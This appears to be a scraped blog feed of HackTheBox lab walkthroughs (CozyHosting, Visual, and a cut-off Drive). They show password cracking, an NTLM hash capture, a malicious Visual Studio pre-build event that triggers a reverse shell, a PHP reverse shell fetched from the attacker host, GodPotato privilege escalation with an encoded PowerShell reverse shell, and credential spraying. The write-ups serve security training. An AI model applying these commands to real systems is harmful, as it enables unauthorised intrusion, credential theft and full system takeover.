spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect spring.jpa.hibernate.ddl-auto=none spring.jpa.database=POSTGRESQL spring.datasource.platform=postgres spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting spring.datasource.username=postgres spring.datasource.password=Vg\u0026amp;nvzAQ7XxR Here, we have credentials for postgres.\nCracking password hashes from postgres database Connecting to postgres:\n1 2 3 4 5 6 7 app@cozyhosting:/app$ psql -h localhost -d cozyhosting -U postgres Password for user postgres: psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1)) SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off) Type \u0026#34;help\u0026#34; for help. cozyhosting=# Enumerating the postgres database:\n1 2 3 4 5 6 7 8 9 10 11 cozyhosting=# SELECT * FROM users; WARNING: terminal is not fully functional Press RETURN to continue name | password | role -----------+--------------------------------------------------------------+----- -- kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User admin | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi n (2 rows) Perhaps we can crack the admin password? Indeed we can, and it cracks to the classic manchesterunited:\n1 2 3 4 5 6 7 8 9 10 $ john hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status manchesterunited (?) 1g 0:00:00:33 DONE (2023-09-03 01:53) 0.02980g/s 83.69p/s 83.69c/s 83.69C/s dougie..keyboard Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. admin:manchesterunited\nFor potential targets on the box, we can check /etc/passwd for the valid accounts. When we grep for lines ending in sh, we are omitting most non-user accounts with shells like nologin or false:\n1 2 3 4 5 $ cat /etc/passwd | grep -e sh$ root:x:0:0:root:/root:/bin/bash app:x:1001:1001::/home/app:/bin/sh postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash josh:x:1003:1003::/home/josh:/usr/bin/bash With josh as the primary candidate, we can try to use ssh login:\n1 2 3 4 $ ssh josh@cozyhosting.htb josh@cozyhosting.htb\u0026#39;s password: Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64) \u0026lt;...SNIP...\u0026gt; It does indeed work as josh\u0026rsquo;s password. If it hadn\u0026rsquo;t the next guess would be for root, which also might not allow ssh authentication. By default, root authentication over ssh is not allowed.\nPrivilege Escalation GTFOBins on SUID Josh can ssh as root:\n1 2 3 4 5 6 7 josh@cozyhosting:~$ sudo -l Matching Defaults entries for josh on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User josh may run the following commands on localhost: (root) /usr/bin/ssh * Checking gtfobins, we have an easy win:\n1 2 3 josh@cozyhosting:~$ sudo ssh -o ProxyCommand=\u0026#39;;sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026#39; x # whoami root ","date":"2024-03-02T00:54:16-06:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-cozyhosting/CozyHosting_hu57b040a445aedb3fdc2bc656dc9a4afd_278920_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-cozyhosting/","title":"HackTheBox - CozyHosting"},{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 Nmap scan report for 10.129.144.164 Host is up (0.076s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17) |_http-title: Visual - Revolutionizing Visual Studio Builds |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.21 seconds Visiting the website, we see details on a Visual Studio project: On the home page, we see interesting options at the bottom including a submission form to provide our own repo:\nWhen we provide our system\u0026rsquo;s IP address, we will receive a connection:\n1 2 3 4 5 6 7 8 9 10 11 ┌──(kali㉿kali)-[~/Documents/visual] └─$ nc -nvlp 80 listening on [any] 80 ... connect to [10.10.14.134] from (UNKNOWN) [10.129.144.164] 49672 GET /repo/info/refs?service=git-upload-pack HTTP/1.1 Host: 10.10.14.134 User-Agent: git/2.41.0.windows.1 Accept: */* Accept-Encoding: deflate, gzip, br, zstd Pragma: no-cache Git-Protocol: version=2 Using responder, we can receive an NTLM hash:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ┌──(kali㉿kali)-[~/Documents/visual] └─$ sudo responder -I tun0 __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR \u0026amp; MDNS Responder 3.1.3.0 \u0026lt;...SNIP...\u0026gt; [+] Listening for events... [HTTP] NTLMv2 Client : 10.129.144.164 [HTTP] NTLMv2 Username : VISUAL\\enox [HTTP] NTLMv2 Hash : enox::VISUAL:49ed5e7eb09d8a6d:6A0C757814963C7E2CF4D97DE665A407:010100000000000098A826EAA6F4D9018E894BC5012324680000000002000800300058005600370001001E00570049004E002D00460053003500550036005900590043004A00470047000400140030005800560037002E004C004F00430041004C0003003400570049004E002D00460053003500550036005900590043004A00470047002E0030005800560037002E004C004F00430041004C000500140030005800560037002E004C004F00430041004C000800300030000000000000000000000000300000FB112DC1D7A6EBADEFA202CE1B3B39EEC9982696A12273A639BEAB0E53B514620A001000000000000000000000000000000000000900220048005400540050002F00310030002E00310030002E00310034002E003100330034000000000000000000 Unfortunately, the usefulness of this retrieval is limited since only port 80 is open.\nTroubleshooting the Git Repo building Back to the website, we are detailed an error that reveals it is searching for a .sln file, the core component of a visual studio project Using a python http server, we can see the request information more clearly. This is not simply downloading a .sln file, but rather trying to clone a git repository. Although it may be possible to emulate a git repo from an http server with the right file configuration, this is beyond my skillset. I opted to install Gitea locally, so I can host my own server that the machine can pull from. Note that these HTB machines are isolated from the broad internet, so pulling from a public web service like github will not be possible.\n1 2 3 4 5 ┌──(kali㉿kali)-[~/Documents/visual] └─$ python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.129.144.164 - - [01/Oct/2023 16:52:44] code 404, message File not found 10.129.144.164 - - [01/Oct/2023 16:52:44] \u0026#34;GET /info/refs?service=git-upload-pack HTTP/1.1\u0026#34; 404 - To set up gitea, I followed the preparations from this post. The gitea binary/setup was retrieved from their main site, https://about.gitea.com/. There are many release versions to select, so be sure it matches your system requirements.\nSetting up a self-hosted Gitea server Before anything, it is necessary to initialize mysql:\n1 2 ┌──(kali㉿kali)-[~] └─$ sudo service mysql start Next, we can enter mysql by invoking sudo:\n1 2 3 4 5 6 7 8 9 10 11 ┌──(kali㉿kali)-[~/Documents/visual/test3/MyApp] └─$ sudo mysql -u root Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 2506 Server version: 10.11.4-MariaDB-1 Debian 12 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. MariaDB [(none)]\u0026gt; Now, we can follow the instructions to set up a local gitea service:\n1 2 3 4 5 6 7 8 9 10 11 MariaDB [(none)]\u0026gt; use mysql; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [mysql]\u0026gt; CREATE USER \u0026#39;gitea\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;gitea\u0026#39;; Query OK, 0 rows affected (0.019 sec) MariaDB [mysql]\u0026gt; CREATE DATABASE giteadb CHARACTER SET \u0026#39;utf8mb4\u0026#39; COLLATE \u0026#39;utf8mb4_unicode_ci\u0026#39;; Query OK, 1 row affected (0.011 sec) MariaDB [mysql]\u0026gt; GRANT ALL PRIVILEGES ON giteadb.* TO \u0026#39;gitea\u0026#39;; Query OK, 0 rows affected (0.011 sec) And now, we are ready to initialize gitea. Start by executing the extracted binary:\n1 2 3 4 5 6 7 ┌──(kali㉿kali)-[~/Documents/gitea] └─$ ./gitea-1.21-linux-amd64 2023/10/03 20:34:06 cmd/web.go:242:runWeb() [I] Starting Gitea on PID: 66899 \u0026lt;...SNIP...\u0026gt; 2023/10/03 20:34:06 cmd/web.go:304:listen() [I] Listen: http://0.0.0.0:3000 2023/10/03 20:34:06 cmd/web.go:308:listen() [I] AppURL(ROOT_URL): http://localhost:3000/ 2023/10/03 20:34:06 ...s/graceful/server.go:70:NewServer() [I] Starting new Web server: tcp:0.0.0.0:3000 on PID: 66899 This execution sets the gitea service on port 3000. Before we can start running, we need to configure it to use our MySQL server. Below is the completed form for myself. Note the password will be whatever you made the IDENTIFIED BY parameter during the database setup. In this scenario, it is gitea. Press \u0026ldquo;Install Gitea\u0026rdquo; at the bottom of the page, and setup will be complete. After it all, we finally have our own gitea service set up and running: Now we can put whatever we want for an account, host our own repos, and even share them with whoever can access our system. Since I made this with the exclusive purpose of interacting with the box, I just made my account using the completely original asdf credentials.\nSupplying a Visual Studio project I don\u0026rsquo;t typically do visual studio things, but I have an old Chip8 project that was built with visual studio. I cloned this repo, then submitted a copy to this local gitea server: Other .sln sources can probably be easily obtained, or even creating one by launching Visual Studio if that is an option. When we send this to build, we can see a new error message:\n1 2 3 4 5 6 7 8 9 10 11 12 13 Build started 10/2/2023 8:19:35 AM. Logging verbosity is set to: Detailed.Process = \u0026#34;C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\MSBuild\\Current\\Bin\\msbuild.exe\u0026#34; \u0026lt;...SNIP...\u0026gt; Build FAILED. \u0026#34;C:\\Windows\\Temp\\32a8f43cea993e0b28dd5c9e25ec34\\Chip8.sln\u0026#34; (default target) (1) -\u0026gt; (Build target) -\u0026gt; C:\\Windows\\Temp\\32a8f43cea993e0b28dd5c9e25ec34\\Chip8.sln.metaproj : error MSB3202: The project file \u0026#34;C:\\Windows\\Temp\\32a8f43cea993e0b28dd5c9e25ec34\\Chip8\\Chip8.csproj\u0026#34; was not found. [C:\\Windows\\Temp\\32a8f43cea993e0b28dd5c9e25ec34\\Chip8.sln] 0 Warning(s) 1 Error(s) Time Elapsed 00:00:00.34 For whatever reason, it is unable to find dependencies in the Chip8 folder.. After moving files around and trying other simple renaming tactics, I was unable to get the Chip8 emulator to build.\nCreating a simple dotnet project Next, I opted for a more simple project starting with a basic dotnet tutorial:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌──(kali㉿kali)-[~/Documents/visual/test2] └─$ dotnet new console -o MyApp -f net6.0 The template \u0026#34;Console App\u0026#34; was created successfully. Processing post-creation actions... Running \u0026#39;dotnet restore\u0026#39; on /home/kali/Documents/visual/test2/MyApp/MyApp.csproj... Determining projects to restore... Restored /home/kali/Documents/visual/test2/MyApp/MyApp.csproj (in 126 ms). Restore succeeded. ┌──(kali㉿kali)-[~/Documents/visual/test2] └─$ cd MyApp ┌──(kali㉿kali)-[~/Documents/visual/test2/MyApp] └─$ ls MyApp.csproj obj Program.cs Trying to build now will result in an error about missing the sln file, so I grabbed the Chip8.sln file from earlier, and fixed the names to \u0026ldquo;MyApp\u0026rdquo;:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 Microsoft Visual Studio Solution File, Format Version 12.00 # Visual Studio 15 VisualStudioVersion = 15.0.28010.2050 MinimumVisualStudioVersion = 10.0.40219.1 Project(\u0026#34;{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}\u0026#34;) = \u0026#34;MyApp\u0026#34;, \u0026#34;MyApp.csproj\u0026#34;, \u0026#34;{740C32CA-9964-445F-8514-062C4228FD28}\u0026#34; EndProject Global GlobalSection(SolutionConfigurationPlatforms) = preSolution Debug|Any CPU = Debug|Any CPU Release|Any CPU = Release|Any CPU EndGlobalSection GlobalSection(ProjectConfigurationPlatforms) = postSolution {740C32CA-9964-445F-8514-062C4228FD28}.Debug|Any CPU.ActiveCfg = Debug|Any CPU {740C32CA-9964-445F-8514-062C4228FD28}.Debug|Any CPU.Build.0 = Debug|Any CPU {740C32CA-9964-445F-8514-062C4228FD28}.Release|Any CPU.ActiveCfg = Release|Any CPU {740C32CA-9964-445F-8514-062C4228FD28}.Release|Any CPU.Build.0 = Release|Any CPU EndGlobalSection GlobalSection(SolutionProperties) = preSolution HideSolutionNode = FALSE EndGlobalSection GlobalSection(ExtensibilityGlobals) = postSolution SolutionGuid = {45D5498A-0A7F-455B-B1DD-4A93EFD46DE3} EndGlobalSection EndGlobal Now when we submit this repo for building, the build will pass! We are given the following files in return: Now we can have the service build executables for us, but how can this be abused? The key hint is the emphasis on using visual studio.\nExploiting VS\u0026rsquo;s pre-build event Visual Studio supports pre-build event execution that we can use to execute our own malicious scripts. The easiest way to do so is use Visual Studio\u0026rsquo;s GUI, however I do not have this installed. I used this article as a reference to introduce manually. Very simply, we can add a reverse shell bat file to our repository, and edit the csproj file to call the file. MyApp2.csproj:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;Project Sdk=\u0026#34;Microsoft.NET.Sdk\u0026#34;\u0026gt; \u0026lt;Target Name=\u0026#34;PreBuild\u0026#34; BeforeTargets=\u0026#34;PreBuildEvent\u0026#34;\u0026gt; \u0026lt;Exec Command=\u0026#34;call prebuild.bat\u0026#34; /\u0026gt; \u0026lt;/Target\u0026gt; \u0026lt;PropertyGroup\u0026gt; \u0026lt;OutputType\u0026gt;Exe\u0026lt;/OutputType\u0026gt; \u0026lt;TargetFramework\u0026gt;net6.0\u0026lt;/TargetFramework\u0026gt; \u0026lt;ImplicitUsings\u0026gt;enable\u0026lt;/ImplicitUsings\u0026gt; \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt; \u0026lt;/PropertyGroup\u0026gt; \u0026lt;/Project\u0026gt; The new repository: Now when this is submitted for building, I receive a connection on my nc listener:\n1 2 3 4 5 6 7 ┌──(kali㉿kali)-[~/Documents/visual/test4/MyApp2] └─$ nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.134] from (UNKNOWN) [10.129.139.209] 49710 whoami visual\\enox PS C:\\Windows\\Temp\\b492bdbeb505f5afab24f97c093323\u0026gt; Lateral Movement After some enumeration, there isn\u0026rsquo;t much to be done with user enox, so I decide to insert a php reverse shell into the webroot directory. For Windows machines, service accounts will very commonly have the SeImpersonate privilege, which can be used in a potato attack to reach NT Authority/SYSTEM level privileges. The reverse shell used was obtained from https://github.com/Dhayalanb/windows-php-reverse-shell/tree/master\n1 PS C:\\xampp\\htdocs\u0026gt; wget 10.10.14.134/rev.php -outfile rev.php Now upon visiting the page at http://10.10.139.209/rev.php, we receive a connection back:\n1 2 3 4 5 6 7 8 9 10 11 12 ┌──(kali㉿kali)-[~/Documents/visual] └─$ nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.134] from (UNKNOWN) [10.129.145.35] 49674 b374k shell : connected Microsoft Windows [Version 10.0.17763.4840] (c) 2018 Microsoft Corporation. All rights reserved. C:\\temp2\u0026gt;whoami whoami nt authority\\local service We are now NT Authority\\local service, but unfortunately this does not have the same powers as NT Authority\\System. In addition to low filesystem permissions, we have very limited privileges:\n1 2 3 4 5 6 7 8 9 10 11 C:\\Users\u0026gt;whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======== SeChangeNotifyPrivilege Bypass traverse checking Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled Privilege Escalation Fortunately, there is a way to improve our privilege access. FullPowers is a tool we can use to recover the default privilege set of a service account, including SeImpersonate privilege. If we acquire this, we can launch a potato-style attack. Using FullPowers.exe:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 C:\\temp2\u0026gt;.\\FullPowers.exe .\\FullPowers.exe [+] Started dummy thread with id 2444 [+] Successfully created scheduled task. [+] Got new token! Privilege count: 7 [+] CreateProcessAsUser() OK Microsoft Windows [Version 10.0.17763.4851] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======= SeAssignPrimaryTokenPrivilege Replace a process level token Enabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Enabled SeAuditPrivilege Generate security audits Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled After launching, SeImpersonatePrivilege is now present, and we can achieve full system compromise through GodPotato. Using GodPotato.exe, I execute a bat file consisting of a base64-encoded reverse shell:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 C:\\temp2\u0026gt;.\\gp.exe -cmd \u0026#34;C:\\temp2\\rev.bat\u0026#34; .\\gp.exe -cmd \u0026#34;C:\\temp2\\rev.bat\u0026#34; [*] CombaseModule: 0x140705454620672 [*] DispatchTable: 0x140705456926832 [*] UseProtseqFunction: 0x140705456303008 [*] UseProtseqFunctionParamCount: 6 [*] HookRPC [*] Start PipeServer [*] Trigger RPCSS [*] CreateNamedPipe \\\\.\\pipe\\2d864ad4-a01d-4f46-a771-5551b936f542\\pipe\\epmapper [*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046 [*] DCOM obj IPID: 00008402-1318-ffff-b73e-c6eaecf7b199 [*] DCOM obj OXID: 0xa2eebb464a7a9dc0 [*] DCOM obj OID: 0x1b73e71602e012f3 [*] DCOM obj Flags: 0x281 [*] DCOM obj PublicRefs: 0x0 [*] Marshal Object bytes len: 100 [*] UnMarshal Object [*] Pipe Connected! [*] CurrentUser: NT AUTHORITY\\NETWORK SERVICE [*] CurrentsImpersonationLevel: Impersonation [*] Start Search System Token [*] PID : 872 Token:0x800 User: NT AUTHORITY\\SYSTEM ImpersonationLevel: Impersonation [*] Find System Token : True [*] UnmarshalObject: 0x80070776 [*] CurrentUser: NT AUTHORITY\\SYSTEM [*] process start with pid 3388 C:\\temp2\u0026gt;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQ\u0026lt;...SNIP...\u0026gt; Meanwhile on my listener:\n1 2 3 4 5 6 7 ┌──(kali㉿kali)-[~] └─$ nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.134] from (UNKNOWN) [10.129.145.35] 49681 whoami nt authority\\system PS C:\\temp2\u0026gt; Now we have full access to the system.\n","date":"2024-02-24T22:18:54-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-visual/Visual_hu2821e9da4ab5851c83163c70bbdf7481_348069_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-visual/","title":"HackTheBox - Visual"},{"content":"Enumeration initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Nmap scan report for 10.129.150.85 Host is up (0.061s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 27:5a:9f:db:91:c3:16:e5:7d:a6:0d:6d:cb:6b:bd:4a (RSA) | 256 9d:07:6b:c8:47:28:0d:f2:9f:81:f2:b8:c3:a6:78:53 (ECDSA) |_ 256 1d:30:34:9f:79:73:69:bd:f6:67:f3:34:3c:1f:f9:4e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://drive.htb/ 3000/tcp filtered ppp Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 10.89 seconds We are redirected to drive.htb, so this must be added to /etc/hosts:\n1 2 3 4 5 6 7 8 9 ┌──(kali㉿kali)-[~] └─$ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 kali ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.129.150.85 drive.htb Exploring Webapp We see what is presumably a Google Drive clone, named Doodle Grive.\nEntering home turns out to be a little different than the main page:\nTrying to view the file redirects us to login, so it looks like we must create an account. Due to password complexity requirements, registered with creds asdf:HackTheBoxDrive\nAfter registering, we see the landing page options have changed. We have the option to upload a file, or view currently posted files, shown in the previous image.\nWhen viewing the welcome post, I notice the url info as well as how the text is generated after clicking Just View.\nThe 100 might be a beginning number sequence related to each post view. It is possible that this could be susceptible to IDOR. Trying the upload feature, we see the rules applied to our submissions: it must have ASCII MIME type and be under 2MB in size. Uploaded contents are only treated as text, so there is not much to be gained from this feature.\nLeaking registered usernames If we try to create a test group and then edit the group, we can find that all established users are suggested to add, leaking all usernames associated with Doodle Grive.\n1 2 3 4 5 jamesMason martinCruz tomHands crisDisel admin We can enumerate potentially vulnerable directories using feroxbuster:\nFeroxbuster Results 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ┌──(kali㉿kali)-[~] └─$ feroxbuster -u http://drive.htb ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── \u0026lt;...SNIP...\u0026gt; [####################] - 11m 30000/30000 46/s http://drive.htb/ [####################] - 11m 30000/30000 46/s http://drive.htb/register/ [####################] - 11m 30000/30000 46/s http://drive.htb/login/ [####################] - 11m 30000/30000 46/s http://drive.htb/upload/ [####################] - 11m 30000/30000 46/s http://drive.htb/reports/ \u0026lt;...SNIP...\u0026gt; [####################] - 11m 30000/30000 46/s http://drive.htb/contact/block/ [####################] - 11m 30000/30000 46/s http://drive.htb/login/block/ [####################] - 11m 30000/30000 46/s http://drive.htb/subscribe/block/ [####################] - 11m 30000/30000 46/s http://drive.htb/home/block/ [####################] - 11m 30000/30000 46/s http://drive.htb/register/block/ [####################] - 11m 30000/30000 46/s http://drive.htb/logout/block/ [####################] - 11m 30000/30000 46/s http://drive.htb/upload/block/ [####################] - 11m 30000/30000 46/s http://drive.htb/reports/block/ [####################] - 3m 30000/30000 146/s http://drive.htb/password_reset/ [####################] - 3m 30000/30000 161/s http://drive.htb/password_reset/block/ [####################] - 2m 30000/30000 262/s http://drive.htb/password_reset/done/ It is worth noting that each visiting directory also has a /\u0026lt;dir\u0026gt;/block variant. Although I am not too familiar, perhaps this is a product of the web service being utilized?\nAbusing IDOR to view private messages Whe we try to abuse IDOR on views, we are presented with unauthorized flag:\nIf we try to access a file not produced already, we receive a different message:\nWe can leak all file numbers associated with created files if we utilize a tool like ffuf. However, it appears it is not necessary. We might eventually find that we can successfully IDOR to unauthorized files using the /\u0026lt;dir\u0026gt;/block variant:\n1 2 3 4 5 hi team! me and my friend(Cris) created a new scheduled backup plan for the database the database will be automatically highly compressed and copied to /var/www/backups/ by a small bash script every day at 12:00 AM *Note: the backup directory may change in the future! *Note2: the backup would be protected with strong password! don\u0026#39;t even think to crack it guys! :) From our previous leak of established users, we can guess that Cris is referring to the user crisDisel. From here, I proceed to view all messages by visiting http://drive.htb/\u0026lt;NUM\u0026gt;/block/.\nFuzzing numbers for valid messages Rather than check manually, here is where we can utilize ffuf to quickly find the ones worth looking at:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 ┌──(kali㉿kali)-[~/Documents/Drive] └─$ ffuf -u http://drive.htb/FUZZ/block -w nums.txt -b \u0026#34;sessionid=7ma2mz3s3kr3so2f2f2we9l0m6af034g\u0026#34; -r /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://drive.htb/FUZZ/block :: Wordlist : FUZZ: /home/kali/Documents/Drive/nums.txt :: Header : Cookie: sessionid=7ma2mz3s3kr3so2f2f2we9l0m6af034g :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ 79 [Status: 200, Size: 5438, Words: 1216, Lines: 175, Duration: 138ms] 99 [Status: 200, Size: 5058, Words: 1110, Lines: 171, Duration: 85ms] 98 [Status: 200, Size: 5016, Words: 1103, Lines: 171, Duration: 91ms] 100 [Status: 200, Size: 5077, Words: 1147, Lines: 172, Duration: 94ms] 101 [Status: 200, Size: 5478, Words: 1232, Lines: 177, Duration: 107ms] :: Progress: [105/105] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 :: Since viewing these files requires a login, we must supply the sessionid cookie from our browser session. We also need the -r flag to follow the 301 redirect. Now viewing the other files: 98: 1 2 3 4 hi team have a great day. we are testing the new edit functionality! it seems to work great! 99: 1 2 3 4 hi team please we have to stop using the document platform for the chat +I have fixed the security issues in the middleware thanks! :) 79: 1 2 3 4 5 6 hey team after the great success of the platform we need now to continue the work. on the new features for ours platform. I have created a user for martin on the server to make the workflow easier for you please use the password \u0026#34;Xk4@KjyrYv8t194L!\u0026#34;. please make the necessary changes to the code before the end of the month I will reach you soon with the token to apply your changes on the repo thanks! From these messages, we can gather a password Xk4@KjyrYv8t194L! for user Martin. Additionally to note for the future, there are backups stored in /var/www/backups/ that are protected with a very \u0026ldquo;secure\u0026rdquo; password.\nFoothold Utilizing password shared in private messages Using hydra to spray name variants, we find that we can indeed ssh as martin:\n1 2 3 4 5 6 7 8 ┌──(kali㉿kali)-[~/Documents/Drive] └─$ hydra -L users.txt -p \u0026#39;Xk4@KjyrYv8t194L!\u0026#39; ssh://drive.htb Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in \u0026lt;...SNIP...\u0026gt; [DATA] attacking ssh://drive.htb:22/ [22][ssh] host: drive.htb login: martin password: Xk4@KjyrYv8t194L! 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-15 12:27:08 Lateral Movement Enumerating open ports, we can see port 3000:\n1 2 3 4 5 6 7 8 9 10 11 12 13 martin@drive:~$ netstat -ntlp (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:33060 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::3000 :::* LISTEN - Using curl, we can see that this is a gitea server:\n1 2 3 4 5 6 7 8 martin@drive:/var/www/html$ curl localhost:3000 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en-US\u0026#34; class=\u0026#34;theme-\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;title\u0026gt; Gitea: Git with a cup of tea\u0026lt;/title\u0026gt; \u0026lt;...SNIP...\u0026gt; To view in our web browser, we can utilize an ssh tunnel:\n1 2 ┌──(kali㉿kali)-[~/Documents/Drive] └─$ ssh -L 3000:localhost:3000 martin@drive.htb Now our kali machine is listening on local port 3000, and will forward requests to drive.htb\u0026rsquo;s local port 3000. In the gitea service, we can login as martin and we can see DoodleGrive source code:\nWithin db_backup.sh, we can view that the backup script leaks zip passwords:\n1 2 3 4 5 6 7 8 9 10 11 12 13 #!/bin/bash DB=$1 date_str=$(date +\u0026#39;%d_%b\u0026#39;) 7z a -p\u0026#39;H@ckThisP@ssW0rDIfY0uC@n:)\u0026#39; /var/www/backups/${date_str}_db_backup.sqlite3.7z db.sqlite3 cd /var/www/backups/ ls -l --sort=t *.7z \u0026gt; backups_num.tmp backups_num=$(cat backups_num.tmp | wc -l) if [[ $backups_num -gt 10 ]]; then #backups is more than 10... deleting to oldest backup rm $(ls *.7z --sort=t --color=never | tail -1) #oldest backup deleted successfully! fi rm backups_num.tmp H@ckThisP@ssW0rDIfY0uC@n:)\nAbusing weak hash algorithms to crack database passwords Before we get too far, it is worth noting the most recent commit on this gitea service: 